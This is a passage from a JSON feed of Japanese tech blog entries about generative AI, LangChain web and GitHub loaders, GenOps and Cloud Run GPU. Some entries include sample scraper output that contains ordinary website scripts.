Intelligenceという名の生成AIが搭載されるようですね。Xなどではいまいち、盛り上がりに欠けているものの、生成AIを生業にするものとしては、触ってみたいです。Google PixelがGeminiを搭載したAIスマホとして売り出されていますが、iPhone・Apple Watch・Macユーザとしては、引き続きiPhoneですかね。Geminiは好きなので、Google Pixel欲しい気もしますがww","isoDate":"2024-09-10T14:56:54.000Z","dateMiliSeconds":1725980214000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"生成 AI アプリで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/gen-ai-telemetry","contentSnippet":"2024 年現在、生成 AI のアプリケーションへの応用が進んでおり^{[要出典]}、運用のためのツールやサービスが登場しています。生成 AI 専用のサービスとしては LangSmith と Langfuse が有名で、それぞれモデルへの入出力やトレースなどを取ることができます。監視 SaaS である Datadog でも LLM Observability の機能がリリースされています。また先月末には Google Cloud のブログにて GenOps についての記事が投稿され、その中でロギングや評価についての記載もありました。https://cloud.google.com...","isoDate":"2024-09-08T03:11:06.000Z","dateMiliSeconds":1725765066000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google の提唱する GenOps って何？","link":"https://zenn.dev/kimitsu/articles/what-is-genops","contentSnippet":"2024 年 8 月 31 日に Google Cloud のブログにて「GenOps: learning from the world of microservices and traditional DevOps」という記事が投稿されました。https://cloud.google.com/blog/products/devops-sre/genops-learnings-from-microservices-and-traditional-devopsこれまでも LangSmith や Langfuse といった LLMOps ツールや Datadog の LLM Observ...","isoDate":"2024-09-07T07:59:59.000Z","dateMiliSeconds":1725695999000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"生成AIにおけるベクトルインデックス","link":"https://shu-kob.hateblo.jp/entry/2024/09/06/234850","contentSnippet":"生成AIにおけるベクトルインデックス：詳細解説ベクトルインデックスとは？ベクトルインデックスは、生成AIにおいて、テキスト、画像、音声などの非構造化データを、数値のベクトルに変換し、そのベクトル間の類似度に基づいて検索や推薦を行うための技術です。なぜベクトルに変換するのか？意味の理解: 単語の並びだけでなく、単語間の関係性や文脈を数値として表現することで、コンピュータがより深くテキストの意味を理解できるようになります。高速な検索: 高次元空間上のベクトル間の距離を計算することで、従来のキーワード検索よりも高速かつ正確に類似したデータを検索できます。多様なデータの統合: テキストだけでなく、画像や音声などもベクトルに変換することで、異なる種類のデータを統一的に扱うことができます。ベクトルインデックスの仕組みベクトル化: テキストや画像などを、ニューラルネットワークなどのモデルを用いて数値のベクトルに変換します。インデックス作成: 変換されたベクトルを、効率的に検索できるようにインデックスを作成します。ベクトル検索: ユーザーのクエリをベクトル化し、作成されたインデックスから最も類似したベクトルを検索します。ベクトルインデックスの活用事例検索エンジン: キーワードだけでなく、文章の意味に基づいたより精度の高い検索を実現します。推薦システム: ユーザーの興味関心に基づいた商品やコンテンツを推薦します。チャットボット: ユーザーの質問に対して、より自然な回答を生成します。画像検索: 画像の内容に基づいた検索や、類似画像の検索を行います。ベクトルインデックスのメリット高精度な検索: キーワードマッチングだけでなく、意味に基づいた検索が可能になります。柔軟なデータ処理: テキストだけでなく、画像や音声など、様々な種類のデータを扱えます。スケーラビリティ: 大量のデータを効率的に処理できます。ベクトルインデックスの課題次元数の呪い: 高次元空間での計算コストが大きくなることがあります。モデルの選択: どのモデルを用いてベクトルに変換するかが、性能に大きく影響します。解釈の難しさ: ベクトル表現が抽象的であり、人間が直感的に理解することが難しい場合があります。今後の展望ベクトルインデックスは、生成AIのさらなる発展に不可欠な技術です。より大規模なデータセットへの対応、より高精度なベクトル化モデルの開発、そして、ベクトル表現の解釈に関する研究が進められていくことが期待されます。具体的な活用事例eコマース: ユーザーの過去の購入履歴や検索履歴に基づいた商品推薦カスタマーサポート: チャットボットによるFAQ検索や、ユーザーの問い合わせに対する自動応答医療: 医療論文の検索や、診断支援金融: リスク評価や不正検知まとめベクトルインデックスは、生成AIの性能を飛躍的に向上させるための重要な技術です。様々な分野での応用が期待されており、今後もその重要性はますます高まっていくでしょう。さらに詳しく知りたい場合は、以下のキーワードで検索してみてください。ベクトルデータベースベクトル検索自然言語処理機械学習ニューラルネットワーク何か他に聞きたいことがあれば、お気軽にご質問ください。より具体的な質問の例:特定のベクトルデータベースについて詳しく知りたいベクトルインデックスを構築する際の注意点ベクトルインデックスを生成AIの開発にどのように活用できるかこれらの質問に対して、より詳細な情報を提供できます。","isoDate":"2024-09-06T14:48:50.000Z","dateMiliSeconds":1725634130000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU + Ollama gemma2 のパフォーマンスを図ってみる","link":"https://zenn.dev/satohjohn/articles/912b4c718a8d74","contentSnippet":"概要Google Cloud 上で申請することで、Cloud Run GPU が使えるようになったので実行してみます。https://cloud.google.com/run/docs/configuring/services/gpu?hl=ja申請フォームGoogle Cloud では以下のように、サンプルが載っているので一旦それの通りの沿って、Gemma2 を起動するアプリケーションを作成します。https://cloud.google.com/run/docs/tutorials/gpu-gemma2-with-ollama?hl=jaとはいえ、それだけだとそのまま...","isoDate":"2024-09-06T08:31:03.000Z","dateMiliSeconds":1725611463000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Scala アプリケーションのビルドを改善してデプロイ時間を 1/4 にした話 | How I improved the build of my Scala application and reduced deployment time by 4x","link":"https://speakerdeck.com/nomadblacky/scala-ahurikesiyonnohirutowogai-shan-sitetehuroishi-jian-wo-1-4-nisitahua-how-i-improved-the-build-of-my-scala-application-and-reduced-deployment-time-by-4x","contentSnippet":"2024/09/06 Scalaわいわい勉強会 #3\\rhttps://scala-tokyo.connpass.com/event/325327/","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"2024年版 運用者たちのLLM","link":"https://speakerdeck.com/nwiizo/2024nian-ban-yun-yong-zhe-tatinollm","contentSnippet":"Cloud Operator Days 2024 クロージングイベント\\rhttps://cloudopsdays.com/closing/\\r\\rとても、端的に言うと「プロンプトエンジニアリングをしよう」って話。\\rこの発表資料は、LLM（大規模言語モデル）によるIT運用の可能性と課題を探っています。AIOpsの概念を基に、LLMがインシデント対応、ドキュメンテーション、コード分析などの運用タスクをどのように改善できるかを説明しています。同時に、LLMの「幻覚」や不完全性といった課題も指摘し、適切な利用方法やプロンプトエンジニアリングの重要性を強調しています。\\r\\r登壇時ブログ\\rhttps://syu-m-5151.hatenablog.com/entry/2024/09/06/154607","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Gemini向けの生成AIのプロンプトエンジニアリング","link":"https://shu-kob.hateblo.jp/entry/2024/09/05/235035","contentSnippet":"cloud.google.com生成AIのプロンプトエンジニアリングは様々な手法がありますが、Gemini for Google Cloudなんて出ているのですね。Google Cloud のプロダクトとサービスに関しては、Geminiは学習済のようで、詳しいようです。読んで勉強したいと思います。","isoDate":"2024-09-05T14:50:35.000Z","dateMiliSeconds":1725547835000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Mini-Omni OSSでSpeech-to-Speechができるようになる？","link":"https://shu-kob.hateblo.jp/entry/2024/09/04/233919","contentSnippet":"arxiv.orgGPT-4oの進化系で、リアルタイム音声会話のできる生成AIがOSSで出たようです。github.comその名もMini-Omni。小型モデルでどうリアルタイム音声会話を実現したのか興味深いですね。生成AIでリアルタイム音声会話は難しく、Speech-to-Text-to-Speechという変換手順を踏む必要があり、時間がかかっていたところ、リアルタイム、つまりSpeech-to-Speechで早く処理できるようになった、ということですね。ぜひ論文を読んでみたいと思います。以下、AbstractをGeminiで訳してみました。（OpenAIちゃうんかいw）言語モデルの進歩とMini-Omni言語モデルの最近の進歩は、大きな成果を上げています。GPT-4oは新たなマイルストーンとして、人間とのリアルタイム会話が可能となり、人間に近い自然な流暢さを示しています。このような人間とコンピュータのインタラクションを実現するには、音声モダリティで直接推論を行い、ストリーミングで出力生成できるモデルが必要となります。しかし、これは現在の学術的なモデルではまだ実現できていません。これらのモデルは通常、音声合成のために追加のTTSシステムに依存しており、望ましくない遅延が生じます。本論文では、リアルタイム音声インタラクションが可能なオーディオベースのエンドツーエンド会話モデルであるMini-Omniを紹介します。この機能を実現するために、テキスト指示による音声生成方法と、推論時のバッチ並列戦略を提案しています。この手法は、元のモデルの言語能力を最小限の劣化で保持するのに役立ち、他の研究がリアルタイムインタラクション機能を確立できるようにします。このトレーニング方法を「Any Model Can Talk」と呼んでいます。また、音声出力を最適化したモデルをファインチューニングするためのVoiceAssistant-400Kデータセットも紹介します。私たちの知る限り、Mini-Omniはリアルタイム音声インタラクションのための最初の完全なエンドツーエンド、オープンソースモデルであり、今後の研究に貴重な可能性を提供します。","isoDate":"2024-09-04T14:39:19.000Z","dateMiliSeconds":1725460759000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloudの生成AIサンプルアプリEnterprise Knowledge Solution (EKS)","link":"https://shu-kob.hateblo.jp/entry/2024/09/03/235705","contentSnippet":"github.comGoogle Cloudの生成AIサンプルアプリ「Enterprise Knowledge Solution」 (EKS)がGitHubで公開されています。EKSはAmazon Elastic Kubernetes Serviceと紛らわしい（苦笑）「Enterprise Knowledge Solution」 はIAPとCloud RunベースでUI付きの生成AIアプリケーションをさっとデプロイできるようです。私はまだ試せていないですが、是非とも触ってみたいですね。terraformでデプロイできる模様。これは面白そう。コードも参考になりそうですね。","isoDate":"2024-09-03T14:57:05.000Z","dateMiliSeconds":1725375425000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChain Meetup Tokyo #2に登壇し、LangChainでWebサイトの内容取得やGitHubソースコード取得、というタイトルで発表しました","link":"https://shu-kob.hateblo.jp/entry/2024/09/02/224106","contentSnippet":"langchain.connpass.comLangChain Meetup Tokyo #2に登壇してきました。私は「LangChainでWebサイトの内容取得やGitHubソースコード取得」というタイトルで発表しました！次は @shu_kob によるLangChainでWebサイトの内容取得やGitHubソースコード取得\uD83D\uDC4F #LangChainJP pic.twitter.com/ryvFxqv6M1— こぎそ | Algomatic (@kgsi) 2024年9月2日   写真撮っていただけてました。ありがとうございます。ChatGPT/LangChainによるチャットシステム構築［実践］入門作者:吉田 真吾,大嶋 勇樹技術評論社Amazon「ChatGPT/LangChainによるチャットシステム構築［実践］入門」の著者、吉田 真吾さん、大嶋 勇樹さんにもお会いできました。お二人の会社、株式会社ジェネラティブエージェンツのCEO西見公宏さんにもお会いでき、コロッケそばさん、技術者としてステキ‼️ #langchainjp pic.twitter.com/N1GE4ArjJ0— \uD835\uDE4E\uD835\uDE5D\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\uD835\uDE64 吉田真吾 (@yoshidashingo) 2024年9月2日   65歳で登壇されたコロッケそばさんかっこよかったです！ speakerdeck.com↑私の資料はこちらにアップロードしています。様々な学びがあり、もっと生成AIを頑張ろう、と思えた刺激的なMeetupでした！","isoDate":"2024-09-02T13:41:06.000Z","dateMiliSeconds":1725284466000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでWebサイトの内容取得やGitHubソースコード取得","link":"https://speakerdeck.com/shukob/langchaindewebsaitononei-rong-qu-de-yagithubsosukodoqu-de","contentSnippet":"https://langchain.connpass.com/event/329185/\\r\\rLangChainでは、Webサイトの内容取得やGitHubソースコード取得もできます。\\r使用してみた所感も交えてこれらの機能のご紹介をします。","isoDate":"2024-09-02T04:00:00.000Z","dateMiliSeconds":1725249600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Project IDX での Web アプリケーション開発","link":"https://zenn.dev/satohjohn/articles/4e7a1e5e3140e1","contentSnippet":"概要Project IDX (以下 IDX) は Google Cloud の Cloud Workstations をベースに Google がホストする仮想実装環境を提供してくれるサービスになります。https://idx.dev/PWA 対応しているため、install して利用することが可能です。（私は、 https://open-vsx.org/extension/k--kato/intellij-idea-keybindings こちらの extensions を利用しているため keybind を考えると install したほうが扱いやすいというのがあります)...","isoDate":"2024-09-02T03:41:10.000Z","dateMiliSeconds":1725248470000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"LangChainでgithubリポジトリのソースコードを読む方法","link":"https://shu-kob.hateblo.jp/entry/2024/09/01/235529","contentSnippet":"shu-kob.hateblo.jp昨日の記事に関連して、今回はLangChainでgithubリポジトリのソースコードを読む方法です。github.com↑サンプルソースコードを載せています。js.langchain.com↑使い方はこちら実行例npx ts-node githubLoader.ts https://github.com/shu-kob/langchain-sample-codeDocument {  pageContent: \\"import { CheerioWebBaseLoader } from \'@langchain/community/document_loaders/web/cheerio\'\\\\n\\" +    \\"import { RecursiveCharacterTextSplitter } from \'@langchain/textsplitters\'\\\\n\\" +    \\"import { HtmlToTextTransformer } from \'@langchain/community/document_transformers/html_to_text\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  const loader = new CheerioWebBaseLoader(url)\\\\n\' +    \'  const docs = await loader.load()\\\\n\' +    \\"  const splitter = RecursiveCharacterTextSplitter.fromLanguage(\'html\')\\\\n\\" +    \'  const transformer = new HtmlToTextTransformer()\\\\n\' +    \'  const sequence = splitter.pipe(transformer)\\\\n\' +    \'  const newDocuments = await sequence.invoke(docs)\\\\n\' +    \\"  console.log(\'newDocuments:\')\\\\n\\" +    \'  console.log(newDocuments)\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'cheerioWebBaseLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import { GithubRepoLoader } from \'@langchain/community/document_loaders/web/github\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function readSorceCodesFromGithub(url: string) {\\\\n\' +    \'\\\\n\' +    \'  const loader = new GithubRepoLoader(\\\\n\' +    \'    url,\\\\n\' +    \'    {\\\\n\' +    \'      branch: \\"main\\", // Defaultブランチが \\"master\\" でないか注意。他のブランチも選択可能\\\\n\' +    \'      recursive: true,\\\\n\' +    \'      processSubmodules: true,\\\\n\' +    \'      unknown: \\"warn\\",\\\\n\' +    \'      maxConcurrency: 5, // Defaults to 2\\\\n\' +    \'      ignorePaths: [\\"*.json\\", \\"*.yaml\\", \\"*.yml\\", \\"*config*\\", \\"*.md\\", \\"Dockerfile\\", \\"*ignore\\", \\".eslintrc.js\\", \\"*.svg\\"] // 除外するファイルパス\\\\n\' +    \'    }\\\\n\' +    \'  );\\\\n\' +    \'\\\\n\' +    \'  for await (const doc of loader.loadAsStream()) {\\\\n\' +    \'    console.log(doc)\\\\n\' +    \'  }\\\\n\' +    \'};\\\\n\' +    \'\\\\n\' +    \'readSorceCodesFromGithub(url)\\\\n\',  metadata: {    source: \'githubLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import * as cheerio from \'cheerio\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  // HTMLの取得\\\\n\' +    \'  const response = await fetch(url)\\\\n\' +    \'  const htmlText = await response.text()\\\\n\' +    \'  const cheerioText = cheerio.load(htmlText)\\\\n\' +    \'\\\\n\' +    \'  // styleとscriptを除去\\\\n\' +    \\"  cheerioText(\'style\').remove()\\\\n\\" +    \\"  cheerioText(\'script\').remove()\\\\n\\" +    \'\\\\n\' +    \\"  const bodyContent: string = cheerioText(\'body\').text().replace(/\\\\\\\\s+/g, \'\')\\\\n\\" +    \'\\\\n\' +    \\"  console.log(\'bodyContent:\')\\\\n\\" +    \'  console.log(bodyContent)\\\\n\' +    \'  return bodyContent\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'webLoad.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}これらのソースコードをプロンプトに含めて、生成AIに投げます。例えば、GitHubリポジトリの仕様を聞くなどです。多くの場合、ソースコードの文量は多くなり、それなりのトークン数になるので、200万トークン対応のGemini-1.5などを使うのが良いでしょう。","isoDate":"2024-09-01T14:55:29.000Z","dateMiliSeconds":1725202529000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでURLからWebページの中身を読み込む方法","link":"https://shu-kob.hateblo.jp/entry/2024/08/31/223416","contentSnippet":"langchain.connpass.com今度、Langchain Meetup Tokyoで喋るので、「LangChainでURLからWebページの中身を読み込む方法」を準備中github.com↑ソースコードを上げておきました。npx ts-node cheerioWebBaseLoader.ts https://shu-kob.hateblo.jp/entry/2024/08/29/234143という形で実行し、以下の結果が得られます。newDocuments:[  Document {    pageContent: \'Toilを無くして徒然なるままに日暮し硯に向かひたい 読者になる Toilを無くして徒然なるままに日暮し硯に向かひたい\\\\n\' +      \'生成AIアプリケーション開発などを行うエンジニアのブログです。 2024-08-29 オライリーのAWS生成AI本 AWSではじめる生成AI\\\\n\' +      \'―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje\\\\n\' +      \'Barth,Shelbee EigenbrodeオライリージャパンAmazon そういや、オライリージャパンからAWSの生成AI本出てますね。\\\\n\' +      \'欲しいと思いながらも買うてない。 現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、\\\\n\' +      \'面白そうなら買うてみるしか！ 翻訳はAWS Japanの久富木 隆一さん。 AWSの中の人が翻訳しているので確かでしょうね！ shu-kob\\\\n\' +      \'2024-08-29 23:41 読者になる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'shu-kob 2024-08-29 23:41 読者になる 広告を非表示にする 関連記事 2024-08-04 日本生成AIユーザ会\\\\n\' +      \'Geminiマルチモーダルプログラミング（ハンズオン）を2024年8月13日(… genai-users.connpass.com\\\\n\' +      \'このブログで何回か書いておりますが… 2024-07-20 Google Gemini 1.5／LlamaIndex／LangChain\\\\n\' +      \'人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5 に対応した技…\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'1.5／LlamaIndex／LangChain 人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5\\\\n\' +      \'に対応した技… 2024-06-07 Google Cloud Vertex AI Agent Builderの使い方\\\\n\' +      \'RAG(Retrieval-Augmented Generation) RAG（Retrieval Augmente… 2024-04-05\\\\n\' +      \'生成AIアプリケーション開発入門ハンズオン genai-users.connpass.com この記事は、日本生成AIユーザ会 #1 … 2023-12-17\\\\n\' +      \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\\\\n\' +      \'コメントを書く \xab SRETT#10 ~ 夏のSRE祭り！アーカイブ動画… 「SREをはじめよう」(Becoming SRE邦訳)が… \xbb プロフィール\\\\n\' +      \'id:shu-kob 読者です 読者をやめる 読者になる 読者になる このブログについて 検索 リンク はてなブログ ブログをはじめる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'このブログについて 検索 リンク はてなブログ ブログをはじめる 週刊はてなブログ はてなブログPro 最新記事 SRETT#10 ~\\\\n\' +      \'夏のSRE祭り！アーカイブ動画公開！ オライリーのAWS生成AI本 「SREをはじめよう」(Becoming SRE邦訳)が出版 Google Cloud\\\\n\' +      \'エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\\\\n\' +      \'後継者不足のCOBOLを生成AIに引き継ぎ 月別アーカイブ ▼ ▶ 2024 2024 / 8 2024 / 7 2024 / 6 2024 / 5\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2024 / 6 2024 / 5 2024 / 4 2024 / 3 2024 / 2 ▼ ▶ 2023 2023 / 12\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2023 / 12 はてなブログをはじめよう！ shu-kobさんは、はてなブログを使っています。あなたもはてなブログをはじめてみませんか？\\\\n\' +      \'はてなブログをはじめる（無料） はてなブログとは Toilを無くして徒然なるままに日暮し硯に向かひたい Powered by Hatena Blog |\\\\n\' +      \\"ブログを報告する if (typeof window.Hatena === \'undefined\') { window.Hatena = {}; } if\\\\n\\" +      \\"(!Hatena.hasOwnProperty(\'Star\')) { Hatena.Star = { VERSION: 2, }; } (function(d,\\\\n\\" +      \'s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id))\\\\n\' +      \'return; js = d.createElement(s); js.id = id; js.src =\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'VERSION: 2, }; } (function(d, s, id) { var js, fjs =\\\\n\' +      \'d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js =\\\\n\' +      \'d.createElement(s); js.id = id; js.src =\\\\n\' +      \'\\"//connect.facebook.net/ja_JP/sdk.js#xfbml=1&appId=719729204785177&version=v17.0\\";\\\\n\' +      \\"fjs.parentNode.insertBefore(js, fjs); }(document, \'script\', \'facebook-jssdk\'));\\\\n\\" +      \'引用をストックしました ストック一覧を見る 閉じる 引用するにはまずログインしてください ログイン 閉じる 引用をストックできませんでした。再度お試しください\\\\n\' +      \'閉じる 限定公開記事のため引用できません。\\\\n\' +      \'\\\\n\' +      \'読者です 読者をやめる 読者になる 読者になる Hatena.Diary.GlobalHeader.init()\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  }]npx  ts-node cheerioWebBaseLoader.ts https://www.gyomusuper.jp/ただし、例えば業務スーパーのホームページを読んだ際、余計なコードが多い。newDocuments:[  Document {    pageContent: \\"$(function() { $(\'.sale_bnr_close\').on(\'click\', function() {\\\\n\\" +      \\"$(\'.sale_bnr\').css(\'display\', \'none\'); }); }); /*onlineshopメニュー*/ .menu_ec:hover\\\\n\\" +      \'{ background:url(\\"./img/menu_ec_on.png\\") no-repeat left center #FFF; transition:\\\\n\' +      \'all .5s; } /*Gyomucaメニュー*/ .menu_gyomuca { display: inline-block; width: 260px;\\\\n\' +      \'height: 44px; text-align: center; text-decoration: none; line-height: 44px;\\\\n\' +      \'outline: none; background:url(\\"./img/menu_gyomuca.png\\") no-repeat left center;\\\\n\' +      \'text-indent:100%; white-space:nowrap; overflow:hidden; } .menu_gyomuca:hover {\\\\n\' +      \'background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center #FFF;\\\\n\' +      \'transition: all .5s; } /*ここまで*/ .menu_gyomuca_on\\\\n\' +      \'{background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center\\\\n\' +      \'#FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'left center #FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\\\\n\' +      \'お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針 ホーム 商品紹介 ミラクルレシピ 特集一覧 安心安全の取り組み\\\\n\' +      \'業務スーパーとは Gyomuca お問い合わせ オンラインショップ FC加盟店募集 会社案内 日本語 / ENGLISH / 中文 .fc_com_link {\\\\n\' +      \'display: flex; margin-left: 40px; margin-top: 5px; } #side_menu ul.fc_com_link\\\\n\' +      \'li { width: auto; height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) {\\\\n\' +      \'margin-right: 10px; } #side_menu ul.fc_com_link li a { position: relative;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) { margin-right:\\\\n\' +      \'10px; } #side_menu ul.fc_com_link li a { position: relative; font-size: 12px;\\\\n\' +      \'color: #fff; font-weight: bold; text-shadow: 0px 0px 0.1px #fff; letter-spacing:\\\\n\' +      \'1px; padding:5px; } #side_menu ul.fc_com_link li a span { content: \\"\\"; display:\\\\n\' +      \'inline-block; width: 0; height: 0; border-style: solid; border-width: 5px 0 5px\\\\n\' +      \'8.7px; border-color: transparent transparent transparent #ffffff; padding-right:\\\\n\' +      \'8px; } #side_menu ul.fc_com_link li a:hover { background-color: #fff; color:\\\\n\' +      \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent #00a55a;\\\\n\' +      \'transition: all .5s; } /*FCページの時*/ #side_menu ul.fc_com_link li a.menu_fc2_on {\\\\n\' +      \'background-color: #fff; color: #00a55a; text-decoration: none; text-shadow: 0px\\\\n\' +      \'0px 0.1px #00a55a; } #side_menu ul.fc_com_link li a.menu_fc2_on span {\\\\n\' +      \'border-color: transparent transparent transparent #00a55a; } /*ここまで*/ .lang_box\\\\n\' +      \'{ margin-left: 42px; display: flex; } .lang_box span:nth-child(n + 2) {\\\\n\' +      \'margin-left: 8px; } .social_box { margin-left: 38px; display: flex; margin-top:\\\\n\' +      \'20px; padding-left: 5px; } .social_box p img { width: 100%; } .social_box\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'{ margin-left: 38px; display: flex; margin-top: 20px; padding-left: 5px; }\\\\n\' +      \'.social_box p img { width: 100%; } .social_box p:nth-of-type(1) { margin-right:\\\\n\' +      \'18px; } .social_box p { width: 35px; } @media screen and (min-width: 1024px) {\\\\n\' +      \'#side_menu .social_box { padding-bottom: 80px; } } // 指定日時を超えたらセールスライド・バナー非表示\\\\n\' +      \\"var now = new Date(); var end = new Date(\'2024/10/31 23:59:59\');\\\\n\\" +      \\"//（指定日時　時間は24h表記） if ( now > end ) { $(\'.sale_slide_top\').remove();\\\\n\\" +      \\"$(\'.sale_bnr\').remove(); }else{ // 保持時間を設定 30分後を取得 var min = new Date();\\\\n\\" +      \'min.setTime( min.getTime() + ( 30 * 60 * 1000 )); console.log(min);\\\\n\' +      `$(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==`,    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'var min = new Date(); min.setTime( min.getTime() + ( 30 * 60 * 1000 ));\\\\n\' +      `console.log(min); $(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==\\\\n` +      `\'on\'?$(\'.sale_bnr\').hide():$(\'.sale_bnr\').show(); $.cookie(\\"sale_bnr\\",\'on\',{\\\\n` +      \\"expires: min , path: \'/\' }); } // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date();\\\\n\\" +      \\"var end = new Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.sale_bnr_img img\').attr(\'src\',\'img/main_sale20240901.png\'); }\\\\n\\" +      \\"$(window).on(\'load\', function(){ $(\'#bakudan\').attr(\'data-lightbox\',\'info01\');\\\\n\\" +      \'}); // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new\\\\n\' +      \\"Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.bakudan_slide\').remove(); $(\'.sale_alide\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new Date(\'2024/8/31\\\\n\\" +      \\"23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) { $(\'.bakudan_slide\').remove();\\\\n\\" +      \\"$(\'.sale_alide img\').attr(\'src\',\'img/main_sale20240901.png\'); } NEW ITEM 新着商品 新着\\\\n\\" +      \'ホット＆スパイシーヌードル\\\\n\' +      \'ホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。\\\\n\' +      \'詳しくはこちら 詳しくはこちら PICK UP!おすすめ商品 商品をもっと見る 新着 パルメザンチーズのリゾット\\\\n\' +      